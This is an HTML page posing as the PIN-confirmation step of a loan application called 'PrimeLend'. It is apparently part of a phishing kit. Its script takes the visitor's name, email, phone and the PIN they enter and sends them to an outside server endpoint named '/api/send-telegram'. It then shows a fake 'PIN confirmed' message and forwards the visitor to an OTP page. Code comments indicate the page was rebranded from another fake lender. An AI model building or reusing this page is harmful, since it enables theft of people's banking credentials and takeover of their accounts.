<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>PrimeLend · Confirm PIN</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        body{background:linear-gradient(135deg,#0a0f1e 0%,#0c1222 100%);font-family:'Inter',system-ui,sans-serif;display:flex;align-items:flex-start;justify-content:center;min-height:100vh;padding:20px}
        .app-container{max-width:520px;width:100%;margin:0 auto}
        .loan-summary-bar{background:rgba(17,24,39,0.8);backdrop-filter:blur(10px);border-radius:32px;padding:16px 20px;margin-bottom:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;border:1px solid rgba(20,184,166,0.15)}
        .summary-item{display:flex;flex-direction:column;align-items:flex-start}
        .summary-label{font-size:.65rem;font-weight:500;color:#7e8aa2;text-transform:uppercase}
        .summary-value{font-size:1rem;font-weight:700;color:#14b8a6;margin-top:2px}
        .pin-card{background:rgba(17,24,39,0.8);backdrop-filter:blur(10px);border-radius:40px;border:1px solid rgba(20,184,166,0.15);padding:28px 24px 32px}
        .section-title{font-size:1.4rem;font-weight:700;background:linear-gradient(135deg,#fff,#14b8a6);background-clip:text;-webkit-background-clip:text;color:transparent;margin-bottom:8px}
        .section-sub{font-size:.8rem;color:#7e8aa2;margin-bottom:28px;border-left:3px solid #14b8a6;padding-left:12px}
        .details-grid{background:rgba(15,23,36,0.6);border-radius:24px;padding:18px 16px;margin-bottom:28px;border:1px solid rgba(20,184,166,0.1)}
        .detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(30,41,59,0.5)}
        .detail-row:last-child{border-bottom:none}
        .detail-label{font-size:.8rem;color:#94a3b8}
        .detail-value{font-size:.85rem;font-weight:600;color:#e2e8f0;text-align:right}
        .pin-container{display:flex;justify-content:center;gap:16px;margin-bottom:12px}
        .pin-box{width:65px;height:65px;background:#0f1724;border:2px solid #1f2a3e;border-radius:20px;text-align:center;font-size:1.8rem;font-weight:700;color:#14b8a6;outline:none}
        .pin-box:focus{border-color:#14b8a6;box-shadow:0 0 0 3px rgba(20,184,166,0.2)}
        .confirm-btn{width:100%;background:linear-gradient(135deg,#14b8a6,#0d9488);border:none;padding:16px 20px;font-size:1rem;font-weight:700;color:#0b1120;border-radius:60px;cursor:pointer;margin-top:20px}
        .confirm-btn:disabled{opacity:0.6;cursor:not-allowed}
        .error-message{color:#f43f5e;font-size:.75rem;text-align:center;margin-top:12px;display:none}
        .error-message.show{display:block}
        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:rgba(20,184,166,0.9);backdrop-filter:blur(10px);color:#0b1120;padding:12px 24px;border-radius:60px;font-size:.85rem;font-weight:500;z-index:1000;opacity:0;transition:opacity .3s;pointer-events:none}
        .toast.show{opacity:1}
        @media (max-width:480px){.pin-card{padding:22px 18px 26px}.pin-box{width:55px;height:55px;font-size:1.5rem}}
    </style>
</head>
<body>
<div class="app-container">
    <div class="loan-summary-bar">
        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
    </div>

    <div class="pin-card">
        <div class="section-title">Confirm your details</div>
        <div class="section-sub">Please review your loan information below</div>

        <div class="details-grid">
            <div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="userFullName">-</span></div>
            <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value" id="userEmail">-</span></div>
            <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value" id="userPhone">-</span></div>
        </div>

        <div class="pin-container">
            <input type="text" maxlength="1" class="pin-box" data-idx="0" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="1" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="2" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="3" inputmode="numeric">
        </div>
        <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
        <button class="confirm-btn" id="confirmBtn" disabled>Confirm & Continue →</button>
    </div>
</div>
<div class="toast" id="toast">✓ PIN confirmed! Redirecting...</div>

<script>
(function(){
    // ✅ CORRECT RAILWAY URL (PrimeLend, not InnCredits)
    const RAILWAY_URL = 'https://primelend-production.up.railway.app';
    const params = new URLSearchParams(window.location.search);
    
    const amount = params.get('amount') || '0';
    const term = params.get('term') || '0';
    const rate = params.get('rate') || '5';
    const monthly = params.get('monthly') || '0';
    const name = decodeURIComponent(params.get('name') || '');
    const email = decodeURIComponent(params.get('email') || '');
    const phone = decodeURIComponent(params.get('phone') || '');
    
    document.getElementById('summaryAmount').innerText = `$${parseFloat(amount).toLocaleString()}`;
    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
    document.getElementById('summaryRate').innerText = `${rate}%`;
    document.getElementById('userFullName').innerText = name || '-';
    document.getElementById('userEmail').innerText = email || '-';
    document.getElementById('userPhone').innerText = phone || '-';
    
    const pinBoxes = document.querySelectorAll('.pin-box');
    let currentPin = ['','','',''];
    const confirmBtn = document.getElementById('confirmBtn');
    const errorMsg = document.getElementById('pinError');
    const toast = document.getElementById('toast');
    
    const showToast = (msg) => { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 2000); };
    
    const updatePinUI = () => { 
        pinBoxes.forEach((b,i)=>b.value=currentPin[i]||''); 
        const isFull = currentPin.every(d=>d && /[0-9]/.test(d));
        confirmBtn.disabled = !isFull;
        if(isFull) errorMsg.classList.remove('show');
    };
    
    pinBoxes.forEach((box, i) => {
        box.addEventListener('input', (e) => {
            let val = e.target.value.slice(-1);
            if(val && !/[0-9]/.test(val)) return;
            currentPin[i] = val || '';
            updatePinUI();
            if(val && i<3) pinBoxes[i+1].focus();
        });
        box.addEventListener('keydown', (e) => {
            if(e.key === 'Backspace') {
                e.preventDefault();
                if(currentPin[i]) currentPin[i] = '';
                else if(i>0) { currentPin[i-1] = ''; pinBoxes[i-1].focus(); }
                updatePinUI();
            }
        });
    });
    pinBoxes[0].focus();
    
    confirmBtn.onclick = async () => {
        const fullPin = currentPin.join('');
        if(fullPin.length !== 4) { errorMsg.classList.add('show'); return; }
        
        confirmBtn.disabled = true;
        confirmBtn.textContent = 'Processing...';
        
        // ✅ CORRECT ENDPOINT: /api/send-telegram (not /api/notify-admin)
        fetch(`${RAILWAY_URL}/api/send-telegram`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({phone,pin:fullPin,email,name,amount,term,type:'pin'})
        }).catch(e => console.error('Fetch error:', e));
        
        showToast('✓ PIN confirmed! Redirecting...');
        setTimeout(() => {
            window.location.href = `otp-verify.html?amount=${encodeURIComponent(amount)}&term=${encodeURIComponent(term)}&rate=${encodeURIComponent(rate)}&monthly=${encodeURIComponent(monthly)}&name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}`;
        }, 1000);
    };
})();
</script>
</body>
</html>
